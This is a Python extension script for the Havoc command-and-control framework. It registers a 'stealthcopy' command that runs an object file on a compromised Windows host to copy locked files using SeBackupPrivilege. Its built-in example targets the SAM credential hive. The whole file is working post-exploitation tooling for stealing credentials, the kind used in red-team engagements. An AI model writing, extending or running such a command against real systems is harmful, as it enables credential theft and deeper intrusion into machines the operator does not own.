from havoc import Demon, RegisterCommand
from struct import pack, calcsize
import os

BOF_PATH = "/home/tlowe/Modules_rubr0/Underlay_bof/Underlay_bof.o"

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addStr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        s += b'\x00'
        fmt = "<L{}s".format(len(s))
        self.buffer += pack(fmt, len(s), s)
        self.size += calcsize(fmt)

    def addInt(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4


def stealthcopy_cmd(demonID, *params):
    demon = Demon(demonID)
    param_list = [str(p) for p in params]

    if param_list and param_list[0].lower() == "stealthcopy":
        param_list = param_list[1:]

    if len(param_list) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Usage: stealthcopy <source> <destination>")
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Example: stealthcopy C:\\Windows\\System32\\config\\SAM C:\\Temp\\SAM")
        return None

    src = param_list[0].strip()
    dst = param_list[1].strip()

    if not src or not dst:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Usage: stealthcopy <source> <destination>")
        return None

    if not os.path.exists(BOF_PATH):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"BOF not found: {BOF_PATH}")
        return None

    packer = Packer()
    packer.addStr(src)
    packer.addStr(dst)

    buf = packer.getbuffer()
    demon.ConsoleWrite(demon.CONSOLE_INFO, f"[dbg] Buffer ({len(buf)} bytes): {buf.hex()}")

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"StealthCopy: {src} -> {dst}")
    demon.InlineExecute(TaskID, "go", BOF_PATH, buf, False)
    return TaskID


RegisterCommand(
    stealthcopy_cmd,
    "",
    "stealthcopy",
    "Copy locked files via SeBackupPrivilege + NtCreateFile (no raw volume I/O)",
    0,
    "<source> <destination>",
    "C:\\Windows\\System32\\config\\SAM C:\\Temp\\SAM"
)
